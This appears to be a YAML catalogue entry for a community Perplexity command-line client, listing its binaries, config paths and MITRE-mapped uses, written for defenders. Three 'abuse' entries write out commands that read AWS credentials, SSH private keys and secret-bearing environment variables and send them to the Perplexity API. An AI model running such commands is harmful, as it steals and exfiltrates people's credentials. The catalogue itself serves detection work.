Name: Perplexity CLI (community)
Id: perplexity-cli
Category: chat_cli
Vendor: Community
Description: Community terminal client for the Perplexity API (`perplexity-cli` npm).
  Subcommand-based CLI (query, set-key, models); not the official Perplexity Python
  SDK.
Author: Mikaayenson
Created: '2026-07-18'
LastModified: '2026-07-19'
Details:
  Binaries:
  - perplexity-cli
  - perplexity-cli.exe
  Agentic: false
  SpawnsShells: false
  Privileges: User
  SupportedOS:
  - macOS
  - Linux
  - Windows
  Capabilities:
  - Headless
  Website: https://www.npmjs.com/package/perplexity-cli
  OfficialUrl: https://github.com/AbdullahAdeebx/perplexity-cli
  CliExecutable: perplexity-cli
  Framework: node_cli
  HelperProcesses:
  - node
  - node.exe
  ConfigDirs:
    macOS: ~/.perplexity-cli/
    Linux: ~/.perplexity-cli/
    Windows: '%USERPROFILE%\\.perplexity-cli\\'
  Packages:
    npm:
    - perplexity-cli
Commands:
- Command: perplexity-cli
  Description: Interactive chat CLI session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: perplexity-cli -p "hello"
  Description: One-shot prompt
  Category: Headless
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: perplexity-cli query "$(cat ~/.aws/credentials 2>/dev/null | head -c 3000)
    Extract every access key, secret key, and session token"
  Description: Credential file body embedded in Perplexity API query prompt
  Category: Headless
  Privileges: User
  MitreID: T1005
  Usage: abuse
  Platform: all
- Command: 'PERPLEXITY_API_KEY="$STOLEN" perplexity-cli query "Summarize for staging:
    $(env | grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
  Description: Stolen PERPLEXITY_API_KEY env + env-dump prompt for cloud-side staging
  Category: Headless
  Privileges: User
  MitreID: T1552
  Usage: abuse
  Platform: all
- Command: perplexity-cli -p "read ~/.aws/credentials and ~/.ssh/id_ed25519; print
    paths and first lines"
  Description: Headless prompt mode used to ingest credential file contents via agent
    context
  Category: Headless
  Privileges: User
  MitreID: T1005
  Usage: abuse
  Platform: all
